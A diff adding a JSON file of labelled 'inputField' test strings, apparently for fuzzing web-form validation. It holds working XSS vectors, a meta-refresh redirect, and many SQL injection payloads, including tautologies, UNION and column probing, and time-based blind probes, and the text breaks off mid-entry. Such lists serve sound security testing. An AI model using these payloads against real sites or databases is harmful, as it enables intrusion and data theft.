@@ -1,0 +1,3895 @@
+[
+    {"inputField": "<script>alert('XSS')</script>", "category": "HTML"},
+    {"inputField": "<img src=x onerror=alert('XSS')>", "category": "HTML"},
+    {"inputField": "<svg/onload=alert('XSS')>", "category": "HTML"},
+    {"inputField": "<body onload=alert('XSS')>", "category": "HTML"},
+    {"inputField": "<iframe src=javascript:alert('XSS')>", "category": "HTML"},
+    {"inputField": "<a href=javascript:alert('XSS')>Click</a>", "category": "HTML"},
+    {"inputField": "<meta http-equiv='refresh' content='0;url=https://trollface.dk/'>", "category": "HTML"},
+    {"inputField": "<input type='text' value='<script>alert(\"XSS\")</script>'>", "category": "HTML"},
+    {"inputField": "<textarea><script>alert('XSS')</script></textarea>", "category": "HTML"},
+    {"inputField": "<div onmouseover=alert('XSS')>Hover</div>", "category": "HTML"},
+    {"inputField": "<marquee onstart=alert('XSS')>XSS</marquee>", "category": "HTML"},
+    {"inputField": "<video><source onerror=alert('XSS')>", "category": "HTML"},
+    {"inputField": "<audio src=x onerror=alert('XSS')>", "category": "HTML"},
+    {"inputField": "<object data=javascript:alert('XSS')>", "category": "HTML"},
+    {"inputField": "<embed src=javascript:alert('XSS')>", "category": "HTML"},
+    {"inputField": "<form action=javascript:alert('XSS')><input type=submit></form>", "category": "HTML"},
+    {"inputField": "<button onclick=alert('XSS')>Click</button>", "category": "HTML"},
+    {"inputField": "<select onchange=alert('XSS')><option>1</option></select>", "category": "HTML"},
+    {"inputField": "<style>@keyframes xss{from{background:red;}to{background:yellow;}}</style><div style='animation:xss 1s infinite;'>XSS</div>", "category": "HTML"},
+    {"inputField": "<link rel=stylesheet href='javascript:alert(\"XSS\")'>", "category": "HTML"},
+    {"inputField": "<base href=javascript:alert('XSS')>", "category": "HTML"},
+    {"inputField": "<isindex type=image src=1 onerror=alert('XSS')>", "category": "HTML"},
+    {"inputField": "<xss id=x onfocus=alert('XSS') tabindex=1>XSS</xss>", "category": "HTML"},
+    {"inputField": "<details open ontoggle=alert('XSS')>", "category": "HTML"},
+    {"inputField": "<math><maction actiontype=statusline target=alert('XSS')>XSS</maction></math>", "category": "HTML"},
+    {"inputField": "<picture><source srcset=javascript:alert('XSS')></picture>", "category": "HTML"},
+    {"inputField": "<template><script>alert('XSS')</script></template>", "category": "HTML"},
+    {"inputField": "<noscript><style>body{background:red;}</style></noscript>", "category": "HTML"},
+    {"inputField": "<applet code='javascript:alert(\"XSS\")'>", "category": "HTML"},
+    {"inputField": "<param name=movie value=javascript:alert('XSS')>", "category": "HTML"},
+    {"inputField": "<blink>XSS</blink>", "category": "HTML"},
+    {"inputField": "<samp>XSS</samp>", "category": "HTML"},
+    {"inputField": "<kbd>XSS</kbd>", "category": "HTML"},
+    {"inputField": "<var>XSS</var>", "category": "HTML"},
+    {"inputField": "<tt>XSS</tt>", "category": "HTML"},
+    {"inputField": "<pre>XSS</pre>", "category": "HTML"},
+    {"inputField": "<code>XSS</code>", "category": "HTML"},
+    {"inputField": "<cite>XSS</cite>", "category": "HTML"},
+    {"inputField": "<abbr>XSS</abbr>", "category": "HTML"},
+    {"inputField": "<bdo dir=rtl>XSS</bdo>", "category": "HTML"},
+    {"inputField": "<bdi>XSS</bdi>", "category": "HTML"},
+    {"inputField": "<ruby>XSS</ruby>", "category": "HTML"},
+    {"inputField": "<rt>XSS</rt>", "category": "HTML"},
+    {"inputField": "<rp>XSS</rp>", "category": "HTML"},
+    {"inputField": "<mark>XSS</mark>", "category": "HTML"},
+    {"inputField": "<time>XSS</time>", "category": "HTML"},
+    {"inputField": "<data>XSS</data>", "category": "HTML"},
+    {"inputField": "<meter>XSS</meter>", "category": "HTML"},
+    {"inputField": "<progress>XSS</progress>", "category": "HTML"},
+    {"inputField": "<output>XSS</output>", "category": "HTML"},
+    {"inputField": "<canvas>XSS</canvas>", "category": "HTML"},
+    {"inputField": "<svg>XSS</svg>", "category": "HTML"},
+    {"inputField": "<math>XSS</math>", "category": "HTML"},
+    {"inputField": "<menuitem>XSS</menuitem>", "category": "HTML"},
+    {"inputField": "<menu>XSS</menu>", "category": "HTML"},
+    {"inputField": "<command>XSS</command>", "category": "HTML"},
+    {"inputField": "<keygen>XSS</keygen>", "category": "HTML"},
+      {"inputField": "<track>XSS</track>", "category": "HTML"},
+    {"inputField": "<source>XSS</source>", "category": "HTML"},
+    {"inputField": "<audio>XSS</audio>", "category": "HTML"},
+    {"inputField": "<video>XSS</video>", "category": "HTML"},
+    {"inputField": "<picture>XSS</picture>", "category": "HTML"},
+    {"inputField": "<iframe>XSS</iframe>", "category": "HTML"},
+    {"inputField": "<embed>XSS</embed>", "category": "HTML"},
+    {"inputField": "<object>XSS</object>", "category": "HTML"},
+    {"inputField": "<param>XSS</param>", "category": "HTML"},
+    {"inputField": "<applet>XSS</applet>", "category": "HTML"},
+    {"inputField": "<basefont>XSS</basefont>", "category": "HTML"},
+    {"inputField": "<bgsound>XSS</bgsound>", "category": "HTML"},
+    {"inputField": "<blink>XSS</blink>", "category": "HTML"},
+    {"inputField": "<isindex>XSS</isindex>", "category": "HTML"},
+    {"inputField": "<listing>XSS</listing>", "category": "HTML"},
+    {"inputField": "<nextid>XSS</nextid>", "category": "HTML"},
+    {"inputField": "<noembed>XSS</noembed>", "category": "HTML"},
+    {"inputField": "<plaintext>XSS</plaintext>", "category": "HTML"},
+    {"inputField": "<spacer>XSS</spacer>", "category": "HTML"},
+    {"inputField": "<wbr>XSS</wbr>", "category": "HTML"},
+    {"inputField": "<xmp>XSS</xmp>", "category": "HTML"},
+    {"inputField": "' OR '1'='1", "category": "SQL"},
+    {"inputField": "' OR '1'='1' --", "category": "SQL"},
+    {"inputField": "' OR '1'='1' /*", "category": "SQL"},
+    {"inputField": "' OR '1'='1' #", "category": "SQL"},
+        {
+        "inputField": "'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "''",
+        "category": "SQL"
+    },
+    {
+        "inputField": "`",
+        "category": "SQL"
+    },
+    {
+        "inputField": "``",
+        "category": "SQL"
+    },
+    {
+        "inputField": ",",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\"\"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "/",
+        "category": "SQL"
+    },
+    {
+        "inputField": "//",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\\",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\\\\",
+        "category": "SQL"
+    },
+    {
+        "inputField": ";",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' or \"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "-- or #",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' OR '1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' OR 1 -- -",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\" OR \"\" = \"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\" OR 1 = 1 -- -",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' OR '' = '",
+        "category": "SQL"
+    },
+    {
+        "inputField": "'='",
+        "category": "SQL"
+    },
+    {
+        "inputField": "'LIKE'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "'=0--+",
+        "category": "SQL"
+    },
+    {
+        "inputField": "OR 1=1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' OR 'x'='x",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' AND id IS NULL; --",
+        "category": "SQL"
+    },
+    {
+        "inputField": "'''''''''''''UNION SELECT '2",
+        "category": "SQL"
+    },
+    {
+        "inputField": "%00",
+        "category": "SQL"
+    },
+    {
+        "inputField": "/*\u2026*/",
+        "category": "SQL"
+    },
+    {
+        "inputField": "+",
+        "category": "SQL"
+    },
+    {
+        "inputField": "| |",
+        "category": "SQL"
+    },
+    {
+        "inputField": "%",
+        "category": "SQL"
+    },
+    {
+        "inputField": "@LOCAL_KEY",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 0",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND true",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND false",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1-false",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1-true",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1*56",
+        "category": "SQL"
+    },
+    {
+        "inputField": "-2",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1' ORDER BY 1--+",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1' ORDER BY 2--+",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1' ORDER BY 3--+",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1' ORDER BY 1,2--+",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1' ORDER BY 1,2,3--+",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1' GROUP BY 1,2,--+",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1' GROUP BY 1,2,3--+",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' GROUP BY columnnames having 1=1 --",
+        "category": "SQL"
+    },
+    {
+        "inputField": "-1' UNION SELECT 1,2,3--+",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' UNION SELECT sum(columnname ) from tablename --",
+        "category": "SQL"
+    },
+    {
+        "inputField": "-1 UNION SELECT 1 INTO @,@",
+        "category": "SQL"
+    },
+    {
+        "inputField": "-1 UNION SELECT 1 INTO @,@,@",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1 AND (SELECT * FROM Users) = 1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' AND MID(VERSION(),1,1) = '5';",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --",
+        "category": "SQL"
+    },
+    {
+        "inputField": ",(select * from (select(sleep(10)))a)",
+        "category": "SQL"
+    },
+    {
+        "inputField": "%2c(select%20*%20from%20(select(sleep(10)))a)",
+        "category": "SQL"
+    },
+    {
+        "inputField": "';WAITFOR DELAY '0:0:30'--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "sleep(5)#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1 or sleep(5)#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\" or sleep(5)#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' or sleep(5)#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\" or sleep(5)=\"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' or sleep(5)='",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1) or sleep(5)#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\") or sleep(5)=\"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "') or sleep(5)='",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1)) or sleep(5)#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\")) or sleep(5)=\"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "')) or sleep(5)='",
+        "category": "SQL"
+    },
+    {
+        "inputField": ";waitfor delay '0:0:5'--",
+        "category": "SQL"
+    },
+    {
+        "inputField": ");waitfor delay '0:0:5'--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "';waitfor delay '0:0:5'--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\";waitfor delay '0:0:5'--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "');waitfor delay '0:0:5'--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\");waitfor delay '0:0:5'--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "));waitfor delay '0:0:5'--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "'));waitfor delay '0:0:5'--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\"));waitfor delay '0:0:5'--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "benchmark(10000000,MD5(1))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1 or benchmark(10000000,MD5(1))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\" or benchmark(10000000,MD5(1))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' or benchmark(10000000,MD5(1))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1) or benchmark(10000000,MD5(1))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\") or benchmark(10000000,MD5(1))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "') or benchmark(10000000,MD5(1))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1)) or benchmark(10000000,MD5(1))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\")) or benchmark(10000000,MD5(1))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "')) or benchmark(10000000,MD5(1))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "pg_sleep(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1 or pg_sleep(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\" or pg_sleep(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' or pg_sleep(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1) or pg_sleep(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\") or pg_sleep(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "') or pg_sleep(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1)) or pg_sleep(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\")) or pg_sleep(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "')) or pg_sleep(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "SLEEP(5)#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "SLEEP(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "SLEEP(5)=\"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "SLEEP(5)='",
+        "category": "SQL"
+    },
+    {
+        "inputField": "or SLEEP(5)",
+        "category": "SQL"
+    },
+    {
+        "inputField": "or SLEEP(5)#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "or SLEEP(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "or SLEEP(5)=\"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "or SLEEP(5)='",
+        "category": "SQL"
+    },
+    {
+        "inputField": "waitfor delay '00:00:05'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "waitfor delay '00:00:05'--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "waitfor delay '00:00:05'#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "benchmark(50000000,MD5(1))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "benchmark(50000000,MD5(1))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "benchmark(50000000,MD5(1))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "or benchmark(50000000,MD5(1))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "or benchmark(50000000,MD5(1))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "or benchmark(50000000,MD5(1))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "pg_SLEEP(5)",
+        "category": "SQL"
+    },
+    {
+        "inputField": "pg_SLEEP(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "pg_SLEEP(5)#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "or pg_SLEEP(5)",
+        "category": "SQL"
+    },
+    {
+        "inputField": "or pg_SLEEP(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "or pg_SLEEP(5)#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "'\\\"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AnD SLEEP(5)",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AnD SLEEP(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AnD SLEEP(5)#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "&&SLEEP(5)",
+        "category": "SQL"
+    },
+    {
+        "inputField": "&&SLEEP(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "&&SLEEP(5)#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' AnD SLEEP(5) ANd '1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "'&&SLEEP(5)&&'1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY SLEEP(5)",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY SLEEP(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY SLEEP(5)#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)",
+        "category": "SQL"
+    },
+    {
+        "inputField": "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "+benchmark(3200,SHA1(1))+'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "+ SLEEP(10) + '",
+        "category": "SQL"
+    },
+    {
+        "inputField": "RANDOMBLOB(500000000/2)",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "RANDOMBLOB(1000000000/2)",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY SLEEP(5)",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5)",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY SLEEP(5)#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5)#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),3#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),3,4#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY SLEEP(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5)--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1,SLEEP(5),3--",
+        "category": "SQL"
+    },
+    {
